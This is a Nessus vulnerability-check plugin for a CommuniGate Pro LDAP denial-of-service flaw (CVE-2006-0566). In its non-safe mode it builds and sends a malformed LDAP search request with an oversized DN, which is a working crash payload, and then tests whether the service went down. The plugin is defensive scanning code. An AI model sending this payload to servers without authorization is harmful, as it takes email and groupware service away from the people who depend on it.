#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20889);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2017/05/11 13:46:37 $");

  script_cve_id("CVE-2006-0566");
  script_bugtraq_id(16501);
  script_osvdb_id(22932);

  script_name(english:"CommuniGate Pro Server < 5.0.8 LDAP Module Field Handling Remote DoS");
  script_summary(english:"Checks for denial of service vulnerability in CommuniGate Pro < 5.0.8 LDAP module");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote application is prone to denial of service attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host appears to be running CommuniGate Pro, a commercial
email and groupware application. 

The version of CommuniGate Pro installed on the remote host includes
an LDAP server that fails to handle requests with Distinguished 
Names (DNs) that contain too many elements.  A user can leverage this 
issue to crash not just the LDAP server, but also the entire 
application on the remote host.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2006/Feb/54");
  script_set_attribute(attribute:"see_also", value:"http://www.stalker.com/CommuniGatePro/History.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to CommuniGate Pro version 5.0.8 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/02/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/02/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:communigate:communigate_pro_core_server");
  script_end_attributes();
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Windows");
  script_copyright(english:"This script is Copyright (C) 2006-2017 Tenable Network Security, Inc.");

  script_dependencies("smtpserver_detect.nasl", "ldap_detect.nasl");
  script_require_ports("Services/smtp", 25, "Services/ldap", 389);

  exit(0);
}


include("global_settings.inc");
include("smtp_func.inc");


ldap_port = get_kb_item("Services/ldap");
if (!ldap_port) ldap_port = 389;
if (!get_port_state(ldap_port)) exit(0);


smtp_port = get_kb_item("Services/smtp");
if (!smtp_port) smtp_port = 25;
if (!get_port_state(smtp_port)) exit(0);
banner = get_smtp_banner(port:smtp_port);


# Unless we're paranoid, make sure the SMTP banner looks like CommuniGate Pro.
if (report_paranoia < 2) {
  if (!banner || "ESMTP CommuniGate Pro" >!< banner) exit(0);
}


# If safe checks are enabled...
if (safe_checks()) {
  # Check the version number in the SMTP banner.
  if (
    banner && 
    egrep(pattern:"^220 .* CommuniGate Pro ([0-4]\.|5\.0\.[0-7])", string:banner)
  ) {
    report = string(
      "Nessus has determined the flaw exists with the application\n",
      "simply by looking at the version in the SMTP banner.\n"
    );

    security_warning(port:ldap_port, extra:report);
    exit(0);
  }
}
# Otherwise try to crash it.
else {
  # A bad request.
  req = raw_string(
    0x30,                              # universal sequence
    0x82, 0x02, 0x38,                  # length of the request
    0x02, 0x01, 0x01,                  # message id (1)
    0x63,                              # search request
    0x82, 0x02, 0x31,                  #   length
    0x04, 0x82, 0x02, 0x15,            #   search term
      "dc=", crap(data:",", length:513), 
      "dc=example,dc=com",
    0x0a, 0x01, 0x02,                  #   scope (subtree)
    0x0a, 0x01, 0x00,                  #   dereference (never)
    0x02, 0x01, 0x00,                  #   size limit (0)
    0x02, 0x01, 0x00,                  #   time limit (0)
    0x01, 0x01, 0x00,                  #   attributes only (false)
    0xa2, 0x05, 0x87, 0x03,            #   filter (!(foo=*))
      "foo", 0x30, 0x00
  );

  # Open a socket and send the request.
  soc = open_sock_tcp(ldap_port);
  if (soc) {
    send(socket:soc, data:req);
    res = recv(socket:soc, length:1024);
    close(soc);

    # If we didn't get anything back, check whether it crashed.
    if (res == NULL) {
      soc2 = open_sock_tcp(ldap_port);
      # There's a problem if we can't reconnect.
      if (!soc2) {
        security_warning(ldap_port);
        exit(0);
      }
      else close(soc2);
    }
  }
}

